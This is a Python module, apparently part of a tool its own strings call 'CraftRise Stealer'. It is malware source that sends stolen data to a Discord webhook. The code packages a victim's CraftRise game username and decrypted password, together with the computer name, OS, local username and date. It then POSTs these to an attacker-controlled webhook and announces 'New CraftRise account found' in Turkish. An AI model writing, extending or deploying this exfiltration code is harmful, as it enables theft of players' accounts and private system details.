"""Discord webhook dispatcher."""

from __future__ import annotations

import re
from typing import Dict, Any, List

import requests

from .system_info import get_system_info

_DISCORD_WEBHOOK_RE = re.compile(
    r"^https://(discord\.com|discordapp\.com)/api/webhooks/\d+/[A-Za-z0-9_-]+$"
)


def validate_webhook_url(url: str) -> bool:
    """Perform a lightweight format check on a Discord webhook URL.

    Args:
        url: Raw webhook URL.

    Returns:
        True if the URL matches the expected Discord pattern.
    """
    return bool(_DISCORD_WEBHOOK_RE.match(url.strip()))


def _build_embed(data: Dict[str, Any]) -> Dict[str, Any]:
    """Construct a Discord embed from decrypted config data.

    Args:
        data: Result dictionary returned by :func:`decryptor.read_craftrise_config`.

    Returns:
        A Discord-compatible embed dictionary.
    """
    system_info = get_system_info()
    config = data.get("data", {})
    success = bool(data.get("success"))

    fields: List[Dict[str, Any]] = [
        {"name": "Kullanıcı Adı", "value": f"`{config.get('username') or 'Bulunamadı'}`", "inline": True},
        {"name": "Şifre", "value": f"`{config.get('decrypted_password') or 'Bulunamadı'}`", "inline": True},
        {"name": "Sürüm", "value": f"`{config.get('version') or 'Bulunamadı'}`", "inline": True},
        {"name": "RAM", "value": f"`{config.get('client_ram') or 'Bulunamadı'}`", "inline": True},
        {"name": "İşletim Sistemi", "value": f"`{system_info.get('os', 'N/A')}`", "inline": True},
        {"name": "Bilgisayar Adı", "value": f"`{system_info.get('computer_name', 'N/A')}`", "inline": True},
        {"name": "Kullanıcı", "value": f"`{system_info.get('username', 'N/A')}`", "inline": True},
        {"name": "Tarih", "value": f"`{system_info.get('date', 'N/A')}`", "inline": True},
    ]

    if config.get("display"):
        fields.append({"name": "Ekran", "value": f"`{config['display']}`", "inline": True})

    if "is_optimized_config" in config:
        fields.append({
            "name": "Optimize Edilmiş",
            "value": f"`{'Evet' if config['is_optimized_config'] else 'Hayır'}`",
            "inline": True,
        })

    return {
        "title": "CraftRise Hesap Bilgileri" if success else "CraftRise Bilgileri Alınamadı",
        "color": 0x00FF00 if success else 0xFF0000,
        "description": data.get("error") if not success else None,
        "fields": fields,
        "footer": {"text": "CraftRise Stealer"},
    }


def send_webhook(webhook_url: str, data: Dict[str, Any]) -> bool:
    """POST a Discord embed via webhook.

    Args:
        webhook_url: Discord webhook URL.
        data: Config/decryption result from :func:`decryptor.read_craftrise_config`.

    Returns:
        True if Discord returns HTTP 204.
    """
    try:
        embed = _build_embed(data)
        success = bool(data.get("success"))

        payload = {
            "username": "CraftRise Stealer",
            "content": (
                "**Yeni CraftRise hesabı bulundu!**"
                if success else
                "**CraftRise bilgileri alınamadı**"
            ),
            "embeds": [embed],
        }

        response = requests.post(webhook_url, json=payload, timeout=15)
        return response.status_code == 204
    except Exception:
        return False
